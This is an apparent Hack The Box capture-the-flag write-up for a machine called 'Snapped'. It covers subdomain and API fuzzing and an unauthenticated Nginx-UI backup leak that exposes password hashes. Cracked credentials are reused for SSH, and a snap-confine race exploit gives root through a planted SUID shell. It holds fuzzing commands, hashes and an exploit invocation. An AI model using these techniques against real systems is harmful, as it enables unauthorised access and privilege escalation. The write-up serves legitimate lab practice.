# ▓▓▓ SN▓PPED — HTB WR1TEUP ▓▓▓

![](https://github.com/Aditya-k-Jangid/Outcast_machines/blob/main/Assects/snapped/Screenshot%202026-07-18%20104234.png)

```
　　　 　／＞　　フ
　　　　| 　_　 _ l
　 　　／` ミ＿xノ
　　 /　　　 　 |
　（　 ヽ　　ﾉ
　│　 ヽ　 ‐＼
　│　　|　|　|
```

**T▓rget:** ▓dmin.sn▓pped.htb / sn▓pped.htb
**U▓er fl▓g:** `2c05f8▓▓▓▓1868bd4▓269▓02bf0▓fc60`
**Ro▓t fl▓g:** `0c814▓f79▓3ca1f8▓a90605▓6379c▓f`

---

## ☠ 1. R3C0N ☠

### Nm▓p

```
PORT   STATE SERVICE
22/tcp open  s▓h
80/tcp open  h▓tp
```

Simple attack surface — sk▓pped a full port scan, went stra▓ght to web.

### W3b (port 80)

Static site for "Sn▓pped." Only info found: `c▓ntact@sn▓pped.htb`.

![](https://github.com/Aditya-k-Jangid/Outcast_machines/blob/main/Assects/snapped/Screenshot%202026-07-11%20155615.png)

Nothing on main site → subd▓main fuzzing kicked off in bg.

```
　　　∧＿∧　　 　
　　 （｡･ω･｡)つ━☆・*。
　　　⊂　　 ノ 　　　・゜+.
　　　しーＪ　　　°。+ *´¨)
　　　　　　　　　　　.· ´¸.·*´¨) ¸.·*¨)
```

### Subdomain D▓scovery

```bash
ffuf -w Desktop/wordlists/subdomain/subdomains-top1million-110000.txt \
     -u http://sn▓pped.htb/ \
     -H 'Host: FUZZ.sn▓pped.htb' \
     -t 400 -fs 154
```

**Result:**

```
adm▓n   [Status: 200, Size: 1407, Words: 164, Lines: 50, Duration: 334ms]
```

![](https://github.com/Aditya-k-Jangid/Outcast_machines/blob/main/Assects/snapped/Screenshot%202026-07-11%20160336.png)

`▓dmin.snapped.htb` → Ngin▓-UI login page. No default creds, no version banner v▓sible.

---

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒

██ F O O T H O L D ██

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒

## 2. F▓OTHOLD

### API 3num3rati0n

Login page is API-driven → fuzzed backend routes:

```bash
ffuf -w Desktop/wordlists/directories/objects.txt \
     -u http://▓dmin.snapped.htb/api/FUZZ \
     -t 400
```

**Result:**

```
certs      [403]
config     [403]
configs    [403]
events     [403]
b▓ckup     [200]  ← interesting
inst▓ll    [200]
node       [403]
settings   [403]
sites      [403]
user       [403]
users      [403]
```

### CVE-2026-▓7944 — Un▓uthenticated Backup Disclosure

`/api/b▓ckup` returns a downloadable zip **w▓thout authentication**, vulnerable to
[CVE-2026-2▓944](https://github.com/advisories/GHSA-g9w5-qffc-6762).

Automated with: [CVE-2026-▓7944.py](https://github.com/Aditya-k-Jangid/Scripts/blob/main/CVE-2026-27944.py)

Backup contains the Nginx-UI SQLite DB → password hashes:

```
▓dmin      $2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm
j▓nathan   $2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq
```

```
  ／l、
（ﾟ､ ｡ ７
  l  ~ヽ
  じしf_,)ノ
```

### Cr▓cking

```
j▓nathan : l▓nkinpark
```

### SS▓ Access

Creds reused for SSH → shell as `j▓nathan` → **▓ser.txt** captured.

---

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒

██ P R I V E S C ██

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒

## 3. Pr▓v Esc

### L▓cal Service Enum

```
127.0.0.1:9000   (unknown)
127.0.0.1:631    OpenPrinting CUPS 2.4.7
0.0.0.0:80       nginx
0.0.0.0:22       ssh
```

CUPS present but **N▓T** the path — real vuln is in `sn▓pd`.

### CV▓-2026-3888 — snap-confine / systemd-tmpfiles TOCTOU LPE

Exploit: [CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE](https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE)

```bash
./exploit librootshell.so
```

```
    (\_/)
    ( •_•)
    / >💀   r00t or bust
```

**Exploit fl▓w:**

| Phase | Action |
|---|---|
| 1 | Enter Firefox snap sandbox, keep mount ns alive |
| 2 | Wait for `/tmp/.sn▓p` cleanup by `systemd-tmpfiles` |
| 3 | Destroy cached mount namespace (forces rebuild) |
| 4 | Race `snap-c▓nfine`'s mimic rebuild via AF_UNIX backpressure, win w/ `renameat2(RENAME_EXCHANGE)` |
| 5 | Overwrite `ld-linux-x86-64.so.2` w/ payload → plants SUID busybox shell |
| 6 | Trigger SUID `sn▓p-confine` → payload runs as r▓ot |
| 7 | Escape into persistent SUID root shell |

**Result:**

```
bash-5.1# whoami
r▓ot
bash-5.1# cat /root/root.txt
0c814▓f79▓3ca1f8▓a906052▓6379cef
```

```
　∧,,,∧
（　>ω<）　 owned. root. done.
（　　　 づ
```

---

## ▓ Summary ▓

| Stage | Vulnerability | Result |
|---|---|---|
| Foothold | CVE-2026-27944 — unauth Ngin▓-UI backup exposure | DB hashes → cracked `j▓nathan` → SSH |
| Privesc | CVE-2026-3888 — sn▓p-confine/systemd-tmpfiles TOCTOU race | Root shell via SUID hijack |

```
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
█   END OF TRANSMISSION   █
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
```
